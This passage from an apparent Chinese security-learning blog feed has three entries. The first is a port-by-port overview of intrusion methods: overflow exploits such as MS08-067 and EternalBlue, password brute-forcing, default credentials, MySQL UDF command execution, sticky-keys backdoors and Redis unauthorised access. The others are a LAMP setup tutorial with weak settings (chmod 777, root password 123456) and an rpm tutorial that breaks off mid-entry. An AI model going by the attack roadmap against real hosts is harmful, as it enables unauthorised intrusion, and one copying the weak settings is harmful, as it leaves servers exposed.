渗透技术，同时脚本渗透技术对 80 端口也构成严重的威胁。</p><p>（1）对于 windows2000 的 IIS5.0 版本，黑客使用远程溢出直接对远程主机进行溢出攻击，成功后直接获得系统权限。</p><p>（2）对于 windows2000 中 IIS5.0 版本，黑客也尝试利用‘Microsoft IISCGI’文件名错误解码漏洞攻击。使用 X-SCAN 可直接探测到 IIS 漏洞。</p><p>（3）IIS 写权限漏洞是由于 IIS 配置不当造成的安全问题，攻击者可向存在此类漏洞的服务器上传恶意代码，比如上传脚本木马扩大控制权限。</p><p>（4）普通的 http 封包是没有经过加密就在网络中传输的，这样就可通过嗅探类工具截取到敏感的数据。如使用 Cain 工具完成此类渗透。</p><p>（5）80 端口的攻击，更多的是采用脚本渗透技术，利用 web 应用程序的漏洞进行渗透是目前很流行的攻击方式。</p><p>（6）对于渗透只开放 80 端口的服务器来说，难度很大。利用端口复用工具可解决此类技术难题。</p><p>（7）CC 攻击效果不及 DDOS 效果明显，但是对于攻击一些小型 web 站点还是比较有用的。CC 攻击可使目标站点运行缓慢，页面无法打开，有时还会爆出 web 程序的绝对路径。</p><p><strong>135**** 端口渗透剖析</strong></p><p>135 端口主要用于使用 RPC 协议并提供 DCOM 服务，通过 RPC 可以保证在一台计算机上运行的程序可以顺利地执行远程计算机上的代码；使用 DCOM 可以通过网络直接进行通信，能够跨包括 HTTP 协议在内的多种网络传输。同时这个端口也爆出过不少漏洞，最严重的就是缓冲区溢出漏洞，曾经疯狂一时的‘冲击波’病毒就是利用这个漏洞进行传播的。对于 135 端口的渗透，黑客的渗透方法为:</p><p>（1）查找存在 RPC 溢出的主机，进行远程溢出攻击，直接获得系统权限。如用‘DSScan’扫描存在此漏洞的主机。对存在漏洞的主机可使用‘ms05011.exe’进行溢出，溢出成功后获得系统权限。（<span class="exturl" data-url="aHR0cHM6Ly93ZW5rdS5iYWlkdS5jb20vdmlldy82OGIzMzQwYzc5NTYzYzFlYzVkYTcxMGEuaHRtbCVFRiVCQyU4OQ==">https://wenku.baidu.com/view/68b3340c79563c1ec5da710a.html）</span></p><p>（2）扫描存在弱口令的 135 主机，利用 RPC 远程过程调用开启 telnet 服务并登录 telnet 执行系统命令。系统弱口令的扫描一般使用 hydra。对于 telnet 服务的开启可使用工具 kali 链接。（<span class="exturl" data-url="aHR0cHM6Ly93ZW5rdS5iYWlkdS5jb20vdmlldy9jOGI5NmFlMjcwMGFiYjY4YTk4MmZiZGYuaHRtbCVFRiVCQyU4OQ==">https://wenku.baidu.com/view/c8b96ae2700abb68a982fbdf.html）</span></p><p><strong>139/445**** 端口渗透剖析</strong></p><p>139 端口是为‘NetBIOS SessionService’提供的，主要用于提供 windows 文件和打印机共享以及 UNIX 中的 Samba 服务。445 端口也用于提供 windows 文件和打印机共享，在内网环境中使用的很广泛。这两个端口同样属于重点攻击对象，139/445 端口曾出现过许多严重级别的漏洞。下面剖析渗透此类端口的基本思路。</p><p>（1）对于开放 139/445 端口的主机，一般尝试利用溢出漏洞对远程主机进行溢出攻击，成功后直接获得系统权限。利用 msf 的 ms-017 永恒之蓝。（https://<span class="exturl" data-url="aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfNDE4ODAwNjkvYXJ0aWNsZS9kZXRhaWxzLw==">blog.csdn.net/qq_41880069/article/details/</span>82908131）</p><p>（2）对于攻击只开放 445 端口的主机，黑客一般使用工具‘MS06040’或‘MS08067’. 可使用专用的 445 端口扫描器进行扫描。NS08067 溢出工具对 windows2003 系统的溢出十分有效，工具基本使用参数在 cmd 下会有提示。（https://<span class="exturl" data-url="aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZ29kXzd6MS9hcnRpY2xlL2RldGFpbHMv">blog.csdn.net/god_7z1/article/details/</span>6773652）</p><p>（3）对于开放 139/445 端口的主机，黑客一般使用 IPC$ 进行渗透。在没有使用特点的账户和密码进行空连接时，权限是最小的。获得系统特定账户和密码成为提升权限的关键了，比如获得 administrator 账户的口令。（<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLndhcmh1dC5jbi9kbWJqLzE0NS5odG1sJUVGJUJDJTg5">https://blog.warhut.cn/dmbj/145.html）</span></p><p>（4）对于开放 139/445 端口的主机，可利用共享获取敏感信息，这也是内网渗透中收集信息的基本途径。</p><p><strong>1433**** 端口渗透剖析</strong></p><p>1433 是 SQLServer 默认的端口，SQL Server 服务使用两个端口：tcp-1433、UDP-1434. 其中 1433 用于供 SQLServer 对外提供服务，1434 用于向请求者返回 SQLServer 使用了哪些 TCP/IP 端口。1433 端口通常遭到黑客的攻击，而且攻击的方式层出不穷。最严重的莫过于远程溢出漏洞了，如由于 SQL 注射攻击的兴起，各类数据库时刻面临着安全威胁。利用 SQL 注射技术对数据库进行渗透是目前比较流行的攻击方式，此类技术属于脚本渗透技术。</p><p>（1）对于开放 1433 端口的 SQL Server2000 的数据库服务器，黑客尝试使用远程溢出漏洞对主机进行溢出测试，成功后直接获得系统权限。（https://<span class="exturl" data-url="aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZ3hqMDIyL2FydGljbGUvZGV0YWlscy8=">blog.csdn.net/gxj022/article/details/</span>4593015）</p><p>（2）暴力破解技术是一项经典的技术。一般破解的对象都是 SA 用户。通过字典破解的方式很快破解出 SA 的密码。（https://<span class="exturl" data-url="aHR0cDovL2Jsb2cuY3Nkbi5uZXQva2FsaV9saW51eC9hcnRpY2xlL2RldGFpbHMv">blog.csdn.net/kali_linux/article/details/</span>50499576）</p><p>（3）嗅探技术同样能嗅探到 SQL Server 的登录密码。</p><p>（4）由于脚本程序编写的不严密，例如，程序员对参数过滤不严等，这都会造成严重的注射漏洞。通过 SQL 注射可间接性的对数据库服务器进行渗透，通过调用一些存储过程执行系统命令。可以使用 SQL 综合利用工具完成。</p><p><strong>1521**** 端口渗透剖析</strong></p><p>1521 是大型数据库 Oracle 的默认监听端口，估计新手还对此端口比较陌生，平时大家接触的比较多的是 Access，MSSQL 以及 MYSQL 这三种数据库。一般大型站点才会部署这种比较昂贵的数据库系统。对于渗透这种比较复杂的数据库系统，黑客的思路如下：</p><p>（1）Oracle 拥有非常多的默认用户名和密码，为了获得数据库系统的访问权限，破解数据库系统用户以及密码是黑客必须攻破的一道安全防线。</p><p>（2）SQL 注射同样对 Oracle 十分有效，通过注射可获得数据库的敏感信息，包括管理员密码等。</p><p>（3）在注入点直接创建 java，执行系统命令。（4）https://<span class="exturl" data-url="aHR0cDovL3d3dy5sZWlwaG9uZS8=">www.leiphone</span>.com/news/201711/JjzXFp46zEPMvJod.html</p><p><strong>2049**** 端口渗透剖析</strong></p><p>NFS（Network File System）即网络文件系统，是 FreeBSD 支持的文件系统中的一种，它允许网络中的计算机之间通过 TCP/IP 网络共享资源。在 NFS 的应用中，本地 NFS 的客户端应用可以透明地读写位于远端 NFS 服务器上的文件，就像访问本地文件一样。如今 NFS 具备了防止被利用导出文件夹的功能，但遗留系统中的 NFS 服务配置不当，则仍可能遭到恶意攻击者的利用。</p><p>未授权访问。（https://<span class="exturl" data-url="aHR0cDovL3d3dy5mcmVlYnVmLw==">www.freebuf</span>.com/articles/network/159468.html） (<span class="exturl" data-url="aHR0cDovL3d3dy5zZWNpc3Qv">http://www.secist</span>.com/archives/6192.htm)</p><p><strong>3306**** 端口渗透剖析</strong></p><p>3306 是 MYSQL 数据库默认的监听端口，通常部署在中型 web 系统中。在国内 LAMP 的配置是非常流行的，对于 php+mysql 构架的攻击也是属于比较热门的话题。mysql 数据库允许用户使用自定义函数功能，这使得黑客可编写恶意的自定义函数对服务器进行渗透，最后取得服务器最高权限。对于 3306 端口的渗透，黑客的方法如下:</p><p>（1）由于管理者安全意识淡薄，通常管理密码设置过于简单，甚至为空口令。使用破解软件很容易破解此类密码，利用破解的密码登录远程 mysql 数据库，上传构造的恶意 UDF 自定义函数代码进行注册，通过调用注册的恶意函数执行系统命令。或者向 web 目录导出恶意的脚本程序，以控制整个 web 系统。</p><p>（2）功能强大的‘cain’同样支持对 3306 端口的嗅探，同时嗅探也是渗透思路的一种。</p><p>（3）SQL 注入同样对 mysql 数据库威胁巨大，不仅可以获取数据库的敏感信息，还可使用 load_file () 函数读取系统的敏感配置文件或者从 web 数据库链接文件中获得 root 口令等，导出恶意代码到指定路径等。</p><p><strong>3389**** 端口渗透剖析</strong></p><p>3389 是 windows 远程桌面服务默认监听的端口，管理员通过远程桌面对服务器进行维护，这给管理工作带来的极大的方便。通常此端口也是黑客们较为感兴趣的端口之一，利用它可对远程服务器进行控制，而且不需要另外安装额外的软件，实现方法比较简单。当然这也是系统合法的服务，通常是不会被杀毒软件所查杀的。使用‘输入法漏洞’进行渗透。</p><p>（1）对于 windows2000 的旧系统版本，使用‘输入法漏洞’进行渗透。</p><p>（2）cain 是一款超级的渗透工具，同样支持对 3389 端口的嗅探。</p><p>（3）Shift 粘滞键后门：5 次 shift 后门</p><p>（4）社会工程学通常是最可怕的攻击技术，如果管理者的一切习惯和规律被黑客摸透的话，那么他管理的网络系统会因为他的弱点被渗透。（5）爆破 3389 端口。这里还是推荐使用 hydra 爆破工具。（6）ms12_020 死亡蓝屏攻击。（https://<span class="exturl" data-url="aHR0cDovL3d3dy5jbmJsb2dzLw==">www.cnblogs</span>.com/R-Hacker/p/9178066.html）（7）https://<span class="exturl" data-url="aHR0cDovL3d3dy5jbmJsb2dzLw==">www.cnblogs</span>.com/backlion/p/9429738.html</p><p><strong>4899**** 端口渗透剖析</strong></p><p>4899 端口是 remoteadministrator 远程控制软件默认监听的端口，也就是平时常说的 radmini 影子。radmini 目前支持 TCP/IP 协议，应用十分广泛，在很多服务器上都会看到该款软件的影子。对于此软件的渗透，思路如下：</p><p>（1）radmini 同样存在不少弱口令的主机，通过专用扫描器可探测到此类存在漏洞的主机。</p><p>（2）radmini 远控的连接密码和端口都是写入到注册表系统中的，通过使用 webshell 注册表读取功能可读取 radmini 在注册表的各项键值内容，从而破解加密的密码散列。</p><p><strong>5432**** 端口渗透剖析</strong></p><p>PostgreSQL 是一种特性非常齐全的自由软件的对象–关系型数据库管理系统，可以说是目前世界上最先进，功能最强大的自由数据库管理系统。包括 kali 系统中 msf 也使用这个数据库；浅谈 postgresql 数据库攻击技术 大部分关于它的攻击依旧是 sql 注入，所以注入才是数据库不变的话题。</p><p>（1）爆破：弱口令：postgres postgres</p><p>（2）缓冲区溢出：CVE-2014-2669。（<span class="exturl" data-url="aHR0cDovL2Ryb3BzLnhtZDUv">http://drops.xmd5</span>.com/static/drops/tips-6449.html）（3）远程代码执行：CVE-2018-1058。（https://<span class="exturl" data-url="aHR0cDovL3d3dy5zZWNwdWxzZS8=">www.secpulse</span>.com/archives/69153.html）</p><p><strong>5631**** 端口渗透剖析</strong></p><p>5631 端口是著名远程控制软件 pcanywhere 的默认监听端口，同时也是世界领先的远程控制软件。利用此软件，用户可以有效管理计算机并快速解决技术支持问题。由于软件的设计缺陷，使得黑客可随意下载保存连接密码的 *.cif 文件，通过专用破解软件进行破解。这些操作都必须在拥有一定权限下才可完成，至少通过脚本渗透获得一个 webshell。通常这些操作在黑客界被称为 pcanywhere 提权技术。</p><p>PcAnyWhere 提权。（https://<span class="exturl" data-url="aHR0cDovL2Jsb2cuY3Nkbi5uZXQvRmx5X2hwcy9hcnRpY2xlL2RldGFpbHMv">blog.csdn.net/Fly_hps/article/details/</span>80377199）</p><p><strong>5900**** 端口渗透剖析</strong></p><p>5900 端口是优秀远程控制软件 VNC 的默认监听端口，此软件由著名的 AT&amp;T 的欧洲研究实验室开发的。VNC 是在基于 unix 和 linux 操作系统的免费的开放源码软件，远程控制能力强大，高效实用，其性能可以和 windows 和 MAC 中的任何一款控制软件媲美。对于该端口的渗透，思路如下：</p><p>（1）VNC 软件存在密码验证绕过漏洞，此高危漏洞可以使得恶意攻击者不需要密码就可以登录到一个远程系统。</p><p>（2）cain 同样支持对 VNC 的嗅探，同时支持端口修改。</p><p>（3）VNC 的配置信息同样被写入注册表系统中，其中包括连接的密码和端口。利用 webshell 的注册表读取功能进行读取加密算法，然后破解。（4）VNC 拒绝服务攻击（CVE-2015-5239）。（<span class="exturl" data-url="aHR0cDovL2Jsb2dzLw==">http://blogs</span>.360.cn/post/vnc% E6%8B%92% E7% BB%9D% E6%9C%8D% E5%8A% A1% E6% BC%8F% E6% B4%9Ecve-2015-5239% E5%88%86% E6%9E%90.html）（5）VNC 权限提升（CVE-2013-6886）。</p><p><strong>6379**** 端口渗透剖析</strong></p><p>Redis 是一个开源的使用 c 语言写的，支持网络、可基于内存亦可持久化的日志型、key-value 数据库。关于这个数据库这两年还是很火的，暴露出来的问题也很多。特别是前段时间暴露的未授权访问。</p><p>（1）爆破：弱口令</p><p>（2）未授权访问 + 配合 ssh key 提权。（<span class="exturl" data-url="aHR0cDovL3d3dy5hbGxveXRlYW0v">http://www.alloyteam</span>.com/2017/07/12910/）</p><p><strong>7001/7002**** 端口渗透剖析</strong></p><p>7001/7002 通常是 weblogic 中间件端口</p><p>（1）弱口令、爆破，弱密码一般为 weblogic/Oracle@123 or weblogic</p><p>（2）管理后台部署 war 后门</p><p>（3）SSRF</p><p>（4）反序列化漏洞</p><p>（5）weblogic_uachttps://<span class="exturl" data-url="aHR0cDovL2dpdGh1Yi5jb20vdnVsaHVi">github.com/vulhub</span>/vulhub/tree/master/weblogic/ssrfhttps://<span class="exturl" data-url="aHR0cDovL2Jicy5wZWRpeS5jb20vdGhyZWFk">bbs.pediy.com/thread</span>-224954.htmhttps://fuping.site/2017/06/05/Weblogic-Vulnerability-Verification/https://<span class="exturl" data-url="aHR0cDovL2Jsb2cuZ2Rzc2VjdXJpdHkuY29tL2xhYnM=">blog.gdssecurity.com/labs</span>/2015/3/30/weblogic-ssrf-and-xss-cve-2014-4241-cve-2014-4210-cve-2014-4.html</p><p><strong>8080**** 端口渗透剖析</strong></p><p>8080 端口通常是 apache_Tomcat 服务器默认监听端口，apache 是世界使用排名第一的 web 服务器。国内很多大型系统都是使用 apache 服务器，对于这种大型服务器的渗透，主要有以下方法：</p><p>（1）Tomcat 远程代码执行漏洞（https://<span class="exturl" data-url="aHR0cDovL3d3dy5mcmVlYnVmLw==">www.freebuf</span>.com/column/159200.html）</p><p>（2）Tomcat 任意文件上传。（<span class="exturl" data-url="aHR0cDovL2xpZWh1LnRhc3Mv">http://liehu.tass</span>.com.cn/archives/836）</p><p>（3）Tomcat 远程代码执行 &amp; 信息泄露。（https://<span class="exturl" data-url="aHR0cDovL3BhcGVyLnNlZWJ1Zy5vcmcv">paper.seebug.org/</span>399/）</p><p>（4）Jboss 远程代码执行。（<span class="exturl" data-url="aHR0cDovL21vYmlsZS53d3cuY25ibG9ncy8=">http://mobile.www.cnblogs</span>.com/Safe3/archive/2010/01/08/1642371.html）</p><p>（5）Jboss 反序列化漏洞。（https://<span class="exturl" data-url="aHR0cDovL3d3dy56eWJ1bHVvLw==">www.zybuluo</span>.com/websec007/note/838374）</p><p>（6）Jboss 漏洞利用。（https://<span class="exturl" data-url="aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTIxNTkzOS9hcnRpY2xlL2RldGFpbHMv">blog.csdn.net/u011215939/article/details/</span>79141624）</p><p><strong>27017**** 端口渗透剖析</strong></p><p>MongoDB，NoSQL 数据库；攻击方法与其他数据库类似</p><p>（1）爆破：弱口令</p><p>（2）未授权访问；（http://<span class="exturl" data-url="aHR0cDovL3d3dy5jbmJsb2dzLmNvbS8=">www.cnblogs.com/</span>LittleHann/p/6252421.html）（3）http://<span class="exturl" data-url="aHR0cDovL3d3dy50aWVqaWFuZy5vcmcv">www.tiejiang.org/</span>19</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;黑客常用端口&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#黑客常用端口&quot;&gt;#&lt;/a&gt; 黑客常用端口&lt;/h1&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;端口&lt;/th&gt;
&lt;th&gt;服务&lt;/th&gt;
&lt;th&gt;入侵方式&lt;/th&gt;
&lt;/t</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://sun-spots.github.io/2022/03/09/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E7%AC%AC%E4%B8%80%E9%98%B6%E6%AE%B5/%E7%AC%AC%E4%B8%89%E5%91%A8/%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA%E4%B8%8E%E9%98%B2%E7%81%AB%E5%A2%99/"/>
    <id>https://sun-spots.github.io/2022/03/09/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E7%AC%AC%E4%B8%80%E9%98%B6%E6%AE%B5/%E7%AC%AC%E4%B8%89%E5%91%A8/%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA%E4%B8%8E%E9%98%B2%E7%81%AB%E5%A2%99/</id>
    <published>2022-03-09T00:57:23.892Z</published>
    <updated>2022-03-09T00:58:01.537Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一web服务器搭建"><a class="markdownIt-Anchor" href="#一web服务器搭建">#</a> 一：Web 服务器搭建</h1><h4 id="11lamp"><a class="markdownIt-Anchor" href="#11lamp">#</a> 1.1：LAMP</h4><p><img data-src="https://cdn.nlark.com/yuque/0/2022/png/2699750/1644410520956-6877ba68-d9d2-484f-aa9f-dd432f35a47c.png" alt="img"></p><p>L --&gt;Linux【操作系统】</p><p>A --&gt;Apache【网页服务器】</p><p>M --&gt;Mysql,MariaDB【数据库管理系统】</p><p>P --&gt; PHP/Perl/Python【脚本语言】</p><p><strong>LAMP</strong> 是指一组通常一起使用来运行动态网站或者服务器的自由软件名称首字母缩写；</p><p>### 实验一：YUM 部署 LAMP 环境 ###</p><p>快捷操作：yum -y install httpd php php-mysql mysql mysql-php mysql-server</p><p>步骤一：执行命令 <code>yum -y install httpd</code>  安装 Apache 组件，并通过浏览器访问 <code>http://127.0.0.1</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Apache的配置文件的默认路径为:</span><br><span class="line">/etc/httpd/conf/httpd.conf</span><br><span class="line">网站默认存放的根目录：</span><br><span class="line">/var/www/html</span><br></pre></td></tr></table></figure><p>步骤二：执行命令 <code>yum -y install php</code>  安装 PHP 组件，并在 /var/www/html 下面创建 info.php 文件，重启 Apache 文件；</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?<span class="function">php</span></span><br><span class="line"><span class="function"><span class="title">phpinfo</span><span class="params">()</span></span>; <span class="comment">//打印输出PHP信息</span></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img data-src="https://cdn.nlark.com/yuque/0/2022/png/2699750/1644413330398-2f51e528-7715-4608-9e09-0c7c08a9cc2f.png" alt="img"></p><p>步骤三：使用以下命令安装 MYSQL 并启动 Mysql 数据库…</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget http:<span class="comment">//repo.mysql.com/mysql-community-release-el7-5.noarch.rpm</span></span><br><span class="line">rpm -ivh mysql-community-release-el7<span class="number">-5.</span>noarch.rpm</span><br><span class="line">yum -y install mysql-server</span><br><span class="line">yum -y install mysql-php</span><br><span class="line">systemctl start mysqld</span><br></pre></td></tr></table></figure><p>步骤四：配置 Mysql 数据库… 并重启 httpd…</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p #不输入密码进入Mysql</span><br><span class="line">set password <span class="keyword">for</span> <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span>=<span class="built_in">password</span>(<span class="string">&#x27;123456&#x27;</span>);  #修改root用户密码</span><br><span class="line">create database phpwind;</span><br></pre></td></tr></table></figure><p>步骤五：网站搭建… 下载 PHPWind 源代码并修改权限进入浏览器进行安装…</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//down.chinaz.com/soft/27165.htm [gbk] #PHPWind源代码下载位置</span></span><br><span class="line">https:<span class="comment">//down.chinaz.com/soft/27521.htm [utf] </span></span><br><span class="line">chmod -R <span class="number">777</span> /var/www/html/upload</span><br><span class="line">http:<span class="comment">//127.0.0.1/upload</span></span><br></pre></td></tr></table></figure><p><img data-src="https://cdn.nlark.com/yuque/0/2022/png/2699750/1644414174427-eb3eb123-30d0-4d5a-b783-cdd150d68bf1.png" alt="img"></p><p>### 实验二：一键部署 LAMP 环境 ###</p><p>LAMP 一键安装脚本：<span class="exturl" data-url="aHR0cHM6Ly93d3cubGFtcC5zaC8=">https://www.lamp.sh/</span></p><p>步骤一：使用以下命令安装 <code>wget</code>  与 <code>git</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y install wget git</span><br></pre></td></tr></table></figure><p>步骤二： <code>git clone</code>  项目并赋予脚本执行权限</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https:<span class="comment">//github.com/teddysun/lamp.git</span></span><br><span class="line">cd lamp</span><br><span class="line">chmod <span class="number">755</span> *.sh</span><br></pre></td></tr></table></figure><p>步骤三：开始安装…</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./lamp.sh</span><br></pre></td></tr></table></figure><h4 id="12lnmp"><a class="markdownIt-Anchor" href="#12lnmp">#</a> 1.2：LNMP</h4><p>LNMP 一键安装脚本：<span class="exturl" data-url="aHR0cHM6Ly9sbm1wLm9yZy8=">https://lnmp.org/</span></p><h4 id="13宝塔面板"><a class="markdownIt-Anchor" href="#13宝塔面板">#</a> 1.3：宝塔面板</h4><p>官网：</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一web服务器搭建&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#一web服务器搭建&quot;&gt;#&lt;/a&gt; 一：Web 服务器搭建&lt;/h1&gt;
&lt;h4 id=&quot;11lamp&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://sun-spots.github.io/2022/03/08/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E7%AC%AC%E4%B8%80%E9%98%B6%E6%AE%B5/%E7%AC%AC%E4%B8%89%E5%91%A8/%E8%BD%AF%E4%BB%B6%E5%8C%85%E7%AE%A1%E7%90%86%E4%B8%8E%E6%9D%83%E9%99%90%E7%AE%A1%E7%90%86/"/>
    <id>https://sun-spots.github.io/2022/03/08/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E7%AC%AC%E4%B8%80%E9%98%B6%E6%AE%B5/%E7%AC%AC%E4%B8%89%E5%91%A8/%E8%BD%AF%E4%BB%B6%E5%8C%85%E7%AE%A1%E7%90%86%E4%B8%8E%E6%9D%83%E9%99%90%E7%AE%A1%E7%90%86/</id>
    <published>2022-03-08T07:38:37.524Z</published>
    <updated>2022-03-08T07:39:41.516Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第二天软件包管理与权限管理"><a class="markdownIt-Anchor" href="#第二天软件包管理与权限管理">#</a> 第二天：软件包管理与权限管理</h1><h2 id="一rpm软件包管理"><a class="markdownIt-Anchor" href="#一rpm软件包管理">#</a> 一：RPM 软件包管理</h2><h3 id="1rpm概述"><a class="markdownIt-Anchor" href="#1rpm概述">#</a> 1.RPM 概述：</h3><ul><li><p>由 Red Hat 公司提出，被众多 Linux 发行版所采用</p></li><li><p>建立统一的数据库文件</p></li><li><p>详细记录软件包安装、卸载等变化信息</p></li><li><p>自动分析软件包依赖关系</p></li></ul><h3 id="2rpm命令格式"><a class="markdownIt-Anchor" href="#2rpm命令格式">#</a> 2.RPM 命令格式：</h3><p>使用 rpm 命令能够实现几乎所有对 RPM 软件包的管理功能，执行 “man rpm” 命令可以获得关于 rmp 命令的详细帮助信息，如下：</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1625191635444-fc241ad3-632c-4323-95f3-77e8348691eb.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1625191531890-095635f3-62a2-424d-b21a-d38a33521ed2.png" alt="img"></p><p>从 rpm 命令的手册页信息中可以看出，rpm 命令有好多的命令选项，结合这些选项主要可以实现以下三类功能。</p><ul><li><p>查询、验证 RPM 软件包的相关信息</p></li><li><p>安装、升级、卸载 RPM 软件包</p></li><li><p>维护 RPM 数据库信息等综合管理操作</p></li></ul><h3 id="3查询rpm软件包信息"><a class="markdownIt-Anchor" href="#3查询rpm软件包信息">#</a> 3. 查询 RPM 软件包信息</h3><p>使用 rpm 命令的查询功能可以查看某个软件包是否已经安装，软件包的用途以及软件包的复制到系统中的文件等相关信息，以便更好地管理 Linux 操作系统中的应用程序。</p><h4 id="31查询已安装的rpm软件信息"><a class="markdownIt-Anchor" href="#31查询已安装的rpm软件信息">#</a> 3.1：查询已安装的 RPM 软件信息</h4><p>rpm -q【子选项】【软件名】</p><ul><li><p>-qa: 显示当前系统中以 RPM 方式安装的所有软件列表</p></li><li><p>-qi: 查看指定软件包的名称、版本、许可协议、用途描述等详细信息</p></li><li><p>-ql: 显示指定的软件包在当前系统中安装的所有目录、文件列表</p></li><li><p>-qf: 查看当前指定的文件或目录是由哪个软件包所安装的</p></li></ul><p>直接执行‘rpm -qa’命令将列出当前操作系统中以 RPM 方式安装的所有软件包清单</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1625193390191-94aa22a8-40c1-4641-8366-6a647aeb14f2.png" alt="img"></p><p>可以结合管道符和‘wc -l’命令统计系统中以安装的 RPM 软件的个数</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1625193541394-171c6491-5617-40f4-bea5-61ab66b8004d.png" alt="img"></p><p>当需要查询某个软件包是否已经安装时，可以直接使用软件名称作为查询参数</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1625193828207-ce101337-227f-42a5-86f1-1b7e9a9d2fd5.png" alt="img"></p><p>如果不知道准确的软件包名称，还可以对全部查询结果进行过滤</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1625193910358-0210973d-d4b0-466b-8c3e-0c5c1fd71fac.png" alt="img"></p><p>如果想知道已安装的某个软件的用途，可以使用 “rpm -qi 软件名”</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1625194010114-16549e20-8d9b-4186-bb32-5be206cda365.png" alt="img"></p><p>当需要查看某个软件包安装的目录和文件清单时，可以使用 “-ql” 选项</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1625194075954-bad70ebd-a218-4ed2-aa51-7de7446edb90.png" alt="img"></p><p>当需要知道系统中的某一个文件是由哪个软件生成的时候，可以用 “-qf”</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1625194395915-56161c4a-02d9-4977-84bc-219153d35d46.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1625194432438-4f8bab4a-f819-493a-ae3e-f1c28b04b027.png" alt="img"></p><p>注意：使用 rpm 命令只能查询通过 RPM 方式安装的软件包信息用，其他途径安装到系统中的软件包，rpm 命令将无法获取相关信息</p><h4 id="32查询未安装的rpm软件包文件中信息"><a class="markdownIt-Anchor" href="#32查询未安装的rpm软件包文件中信息">#</a> 3.2：查询未安装的 RPM 软件包文件中信息</h4><p>使用 “-qp” 选项时，必须以 RPM 软件包文件的路径作为参数（可以有多个），而不是软件包名称</p><ul><li>-qpi: 查看指定软件包的名称、版本、许可协议、用途描述等详细信息</li><li>-qpl: 显示指定的软件包准备要安装的所有目录、文件列表</li></ul><h4 id="33安装-升级-卸载rpm软件包"><a class="markdownIt-Anchor" href="#33安装-升级-卸载rpm软件包">#</a> 3.3：安装、升级、卸载 RPM 软件包</h4><ul><li><p>-i: 在当前系统中安装一个新的 RPM 软件包 - e: 卸载指定名称的软件包</p></li><li><p>-U：检查并升级系统中的某个软件包，若该软件包原来并未安装，则等同于 “-i” 选项</p></li><li><p>-F: 检查更新系统中的某个软件包，若该软件包原来并未安装，则放弃安装</p></li><li><p>-h: 在安装或升级软件包的过程中，以 “#” 号显示安装进度</p></li><li><p>-v: 显示软件安装过程中的详细信息</p></li><li><p>–force: 强制安装某个软件包</p></li><li><p>–nodeps: 在安装或升级、卸载一个软件包时，不检查与其他软件包的依赖关系</p></li><li><p>-e 软件名称：卸载软件包</p></li></ul><h3 id="4实操rpm安装qq"><a class="markdownIt-Anchor" href="#4实操rpm安装qq">#</a> 4. 实操 rpm 安装 QQ</h3><p>①在 centos 里面打开火狐浏览器进入 QQ 官网，选择 linux 版本的 QQ</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1625195893511-370994d5-2849-48e6-a700-a7c1e2aa8352.png" alt="img"></p><p>②选择 x64 架构下的 rpm 版本下载并保存</p><p><img 